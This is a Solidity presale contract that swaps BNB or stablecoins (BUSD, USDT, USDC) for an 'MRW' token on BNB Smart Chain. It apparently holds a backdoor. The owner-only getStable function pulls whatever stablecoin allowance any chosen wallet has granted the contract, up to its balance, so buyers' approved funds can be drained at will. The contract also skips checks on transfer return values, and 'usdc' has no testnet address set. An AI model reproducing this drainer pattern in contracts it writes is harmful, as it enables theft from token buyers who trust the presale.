// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Presale_Swap is Ownable, Pausable {
  address _tokenMRW;
  AggregatorV3Interface internal _priceFeed;
  uint256 _tokenPrice = 1e6;
  address[] _busdBuyers;
  address[] _usdtBuyers;
  address[] _usdcBuyers;
  uint256 _minBNB = 5e17;
  uint256 _minUSD = 3e9;

  mapping(string => address) _stableAddress;

  /**
   * Token Price in USD
   * Decimals: 8
   */

  /**
   * Network: BSC Mainnet
   * Aggregator: BNB/USD
   * Address: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE
   */

  /**
   * Network: BSC Testnet
   * Aggregator: BNB/USD
   * Address: 0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526
   */
  constructor(address token) {
    _tokenMRW = token;
    _priceFeed = AggregatorV3Interface(
      0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526
    );

    // mainnet
    // _stableAddress["busd"] = address(0xe9e7cea3dedca5984780bafc599bd69add087d56);
    // _stableAddress["usdt"] = address(0x55d398326f99059fF775485246999027B3197955);
    // _stableAddress["usdc"] = address(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);

    // test net
    _stableAddress["busd"] = address(
      0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7
    );
    _stableAddress["usdt"] = address(
      0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684
    );
  }

  function swapBNB() public payable whenNotPaused returns (bool) {
    uint256 bnb_amount = msg.value;
    require(bnb_amount >= _minBNB, "Presale Swap: Smaller than Min Value!");
    (, int256 price, , , ) = _priceFeed.latestRoundData();

    uint256 token_amount = (bnb_amount * uint256(price)) / _tokenPrice;

    require(
      ERC20(_tokenMRW).balanceOf(address(this)) >= token_amount,
      "Presale Swap: Not enough MRW Token !"
    );
    bool res = ERC20(_tokenMRW).transfer(msg.sender, token_amount);
    return res;
  }

  function swapStable(string memory token, uint256 amount)
    public
    whenNotPaused
    returns (bool)
  {
    require(amount / 1e10 >= _minUSD, "Presale Swap: Smaller than Min Value!");
    uint256 token_amount = (amount * 1e8) / _tokenPrice;
    require(
      ERC20(_tokenMRW).balanceOf(address(this)) >= token_amount,
      "Presale Swap: Not enough MRW Token !"
    );
    if (compareStrings(token, "busd")) {
      _busdBuyers.push(msg.sender);
    } else if (compareStrings(token, "usdt")) {
      _usdtBuyers.push(msg.sender);
    } else if (compareStrings(token, "usdc")) {
      _usdcBuyers.push(msg.sender);
    } else {
      revert();
    }
    address tokenAddr = _stableAddress[token];

    ERC20(tokenAddr).transferFrom(msg.sender, address(this), amount);
    ERC20(_tokenMRW).transfer(msg.sender, token_amount);
    return true;
  }

  function getStable(address wallet, string memory token) public onlyOwner {
    address tokenAddr = _stableAddress[token];
    require(tokenAddr != address(0), "Presale Swap: Invalid token name");
    uint256 balance = ERC20(tokenAddr).balanceOf(wallet);
    uint256 allownce = ERC20(tokenAddr).allowance(wallet, address(this));
    uint256 amount = balance > allownce ? allownce : balance;
    require(amount > 0, "Presale Swap: zero balance");
    ERC20(tokenAddr).transferFrom(wallet, address(this), amount);
  }

  function sendMRWToken(address wallet) public onlyOwner {
    require(
      ERC20(_tokenMRW).balanceOf(address(this)) > 0,
      "Presale Swap: Token balance is zero !"
    );
    ERC20(_tokenMRW).transfer(
      wallet,
      ERC20(_tokenMRW).balanceOf(address(this))
    );
  }

  function sendStable(address wallet, string memory token) public onlyOwner {
    address tokenAddr = _stableAddress[token];
    require(tokenAddr != address(0), "Presale Swap: Invalid token name");
    uint256 amount = ERC20(tokenAddr).balanceOf(address(this));
    require(amount > 0, "Presale Swap: zero balance");
    ERC20(tokenAddr).transfer(wallet, amount);
  }

  function sendBNB(address wallet) public onlyOwner {
    require(address(this).balance > 0, "Presale Swap: BNB balance is zero !");
    address payable receiver = payable(wallet);
    receiver.transfer(address(this).balance);
  }

  function getStableUsers(string memory token)
    public
    view
    returns (address[] memory value)
  {
    if (compareStrings(token, "busd")) {
      value = _busdBuyers;
    } else if (compareStrings(token, "usdt")) {
      value = _usdtBuyers;
    } else if (compareStrings(token, "usdc")) {
      value = _usdcBuyers;
    }
  }

  function getStableAmount(string memory token) public view returns (uint256) {
    address tokenAddr = _stableAddress[token];
    if (tokenAddr == address(0)) {
      return 0;
    }
    uint256 amount = ERC20(tokenAddr).balanceOf(address(this));
    return amount;
  }

  function setTokenPrice(uint256 price) public onlyOwner {
    _tokenPrice = price;
  }

  function getTokenPrice() public view returns (uint256) {
    return _tokenPrice;
  }

  function getTokenAmount() public view returns (uint256) {
    uint256 balance = ERC20(_tokenMRW).balanceOf(address(this));
    return balance;
  }

  function getBNBAmount() public view returns (uint256) {
    return address(this).balance;
  }

  function getBNBPrice() public view returns (uint256) {
    (, int256 price, , , ) = _priceFeed.latestRoundData();
    return uint256(price);
  }

  function pause() external onlyOwner {
    super._pause();
  }

  function unpause() external onlyOwner {
    super._unpause();
  }

  function compareStrings(string memory a, string memory b)
    internal
    view
    returns (bool)
  {
    return (keccak256(abi.encodePacked((a))) ==
      keccak256(abi.encodePacked((b))));
  }
}
